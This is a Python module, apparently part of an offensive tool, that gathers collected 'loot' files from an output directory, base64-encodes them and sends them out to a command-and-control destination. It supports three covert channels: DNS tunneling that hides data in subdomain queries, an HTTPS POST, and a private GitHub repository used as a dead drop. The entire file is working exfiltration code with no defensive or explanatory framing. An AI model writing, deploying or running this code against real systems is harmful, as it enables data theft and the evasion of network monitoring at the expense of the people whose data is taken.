#!/usr/bin/env python3
"""
exfil.py — data exfiltration over covert channels
DNS tunneling, HTTPS C2, GitHub dead drop
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import socket
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional

log = logging.getLogger("sentinel.exfil")

CHUNK_SIZE = 63  # max DNS label length


class ExfilEngine:
    def __init__(self, c2: Optional[str], output_dir: Path):
        self.c2 = c2
        self.output_dir = output_dir

    async def run(self):
        data = self._collect_loot()
        if not data:
            log.info("no loot to exfil")
            return

        if self.c2 and self.c2.startswith("dns://"):
            domain = self.c2[6:]
            await self._exfil_dns(data, domain)
        elif self.c2 and self.c2.startswith("https://"):
            await self._exfil_https(data)
        elif self.c2 and self.c2.startswith("github://"):
            repo = self.c2[9:]
            await self._exfil_github(data, repo)
        else:
            log.warning(f"unknown c2 scheme: {self.c2}")

    def _collect_loot(self) -> bytes:
        loot = {}

        for f in self.output_dir.glob("*.json"):
            try:
                loot[f.name] = json.loads(f.read_text())
            except Exception:
                pass

        for f in self.output_dir.glob("*.txt"):
            try:
                loot[f.name] = f.read_text()
            except Exception:
                pass

        if not loot:
            return b""

        serialised = json.dumps(loot).encode()
        compressed = base64.b64encode(serialised)
        log.info(f"loot collected: {len(serialised)} bytes ({len(loot)} files)")
        return compressed

    async def _exfil_dns(self, data: bytes, domain: str):
        """Exfil via DNS A record queries — encode data in subdomain labels"""
        chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]
        total = len(chunks)
        log.info(f"DNS exfil: {total} chunks to {domain}")

        for idx, chunk in enumerate(chunks):
            label = chunk.decode("ascii", errors="replace")
            fqdn = f"{idx}.{total}.{label}.{domain}"
            try:
                socket.gethostbyname(fqdn)
                await asyncio.sleep(0.1)
            except Exception:
                pass  # expected — we only need the query to reach the NS

        log.info("DNS exfil complete")

    async def _exfil_https(self, data: bytes):
        """POST loot to HTTPS C2 endpoint"""
        try:
            req = urllib.request.Request(
                self.c2,
                data=data,
                headers={"Content-Type": "application/octet-stream"},
                method="POST"
            )
            r = urllib.request.urlopen(req, timeout=10)
            log.info(f"HTTPS exfil: {r.status}")
        except Exception as e:
            log.error(f"HTTPS exfil failed: {e}")

    async def _exfil_github(self, data: bytes, repo: str):
        """Write loot to private GitHub repo as dead drop"""
        token = os.environ.get("GITHUB_TOKEN")
        if not token:
            log.error("GITHUB_TOKEN not set")
            return

        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "Content-Type": "application/json"
        }

        filename = hashlib.md5(data[:32]).hexdigest()[:8] + ".b64"

        try:
            existing_url = f"https://api.github.com/repos/{repo}/contents/{filename}"
            req = urllib.request.Request(existing_url, headers=headers)
            try:
                r = urllib.request.urlopen(req, timeout=5)
                sha = json.loads(r.read()).get("sha")
            except urllib.error.HTTPError:
                sha = None

            payload = {"message": "update", "content": data.decode()}
            if sha:
                payload["sha"] = sha

            put_req = urllib.request.Request(
                existing_url,
                data=json.dumps(payload).encode(),
                headers=headers,
                method="PUT"
            )
            urllib.request.urlopen(put_req, timeout=10)
            log.info(f"GitHub exfil: {filename} written to {repo}")

        except Exception as e:
            log.error(f"GitHub exfil failed: {e}")
